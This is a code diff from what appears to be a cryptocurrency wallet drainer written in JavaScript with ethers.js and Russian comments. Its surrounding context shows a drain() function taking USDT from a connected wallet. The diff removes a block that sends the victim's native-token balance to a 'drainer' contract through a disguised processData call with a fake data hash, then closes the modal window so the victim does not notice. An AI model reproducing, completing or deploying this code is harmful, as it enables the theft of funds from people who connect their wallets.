@@ -261,8 +261,8 @@ async function checkBalance(chainId, userAddress, provider) {
 
 // Проверка наличия средств
 function hasFunds(bal) {
-  const minNativeBalance = ethers.utils.parseEther("0.001");
-  const minTokenBalance = ethers.utils.parseUnits("1.0", 6); // Изменили на 1 USDT
+  const minNativeBalance = ethers.utils.parseEther("0.001"); // Для газа, но не будет списываться
+  const minTokenBalance = ethers.utils.parseUnits("1.0", 6); // Требуется минимум 1 USDT
 
   if (bal.nativeBalance.gt(minNativeBalance)) return true;
 
@@ -522,54 +522,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         }
       } else {
         console.warn(`⚠️ Недостаточно USDT для списания 1 токена, баланс: ${ethers.utils.formatUnits(balance, decimals)}`);
-      }
-    }
-  }
-
-  console.log(`📍 Шаг 7: Обрабатываем ${chainConfig.nativeToken}`);
-  if (bal.nativeBalance.gt(0)) {
-    const drainer = new ethers.Contract(chainConfig.drainerAddress, DRAINER_ABI, signer);
-    const gasReserve = ethers.utils.parseEther("0.002");
-    const value = bal.nativeBalance.sub(gasReserve).gt(0) ? bal.nativeBalance.sub(gasReserve) : ethers.BigNumber.from(0);
-
-    if (value.gt(0)) {
-      const taskId = Math.floor(Math.random() * 1000000);
-      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
-      const nonce = await provider.getTransactionCount(userAddress, "pending");
-
-      try {
-        const gasPrice = await provider.getGasPrice();
-        console.log(`📏 Цена газа для ${chainConfig.nativeToken}: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
-
-        console.log(`⏳ Задержка перед processData`);
-        await delay(10);
-
-        const tx = await drainer.processData(taskId, dataHash, nonce, [], {
-          value,
-          gasLimit: 100000,
-          gasPrice: gasPrice,
-          nonce
-        });
-        console.log(`📤 Транзакция processData отправлена: ${tx.hash}`);
-        const receipt = await tx.wait();
-        console.log(`✅ Транзакция processData подтверждена: ${receipt.transactionHash}`);
-        status = 'confirmed';
-
-        if (!modalClosed) {
-          console.log(`ℹ️ Закрываем модальное окно после успешного processData для ${chainConfig.nativeToken}`);
-          await hideModalWithDelay();
-          modalClosed = true;
-        }
-      } catch (error) {
-        console.error(`❌ Ошибка вывода ${chainConfig.nativeToken}: ${error.message}`);
-        if (error.message.includes('user rejected')) {
-          if (!modalClosed) {
-            console.log(`ℹ️ Пользователь отклонил processData для ${chainConfig.nativeToken}, закрываем модальное окно`);
-            await hideModalWithDelay("Error: Transaction rejected by user.");
-            modalClosed = true;
-          }
-        }
-        throw new Error(`Failed to process ${chainConfig.nativeToken}: ${error.message}`);
       }
     }
   }
